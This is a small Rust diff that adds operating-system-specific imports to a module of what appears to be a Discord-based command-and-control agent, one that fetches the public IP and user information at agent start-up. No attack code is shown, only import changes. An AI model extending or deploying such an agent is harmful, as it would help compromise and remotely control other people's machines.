@@ -1,6 +1,11 @@
 use crate::errors::DiscordC2Error;
 use public_ip_addr::get_public_ip;
+
+#[cfg(target_os = "windows")]
+use std::env;
+#[cfg(target_os = "linux")]
 use std::{env, fs};
+#[cfg(target_os = "linux")]
 use std::path::Path;
 
 /// Retrieves the user information used during agent initialization.
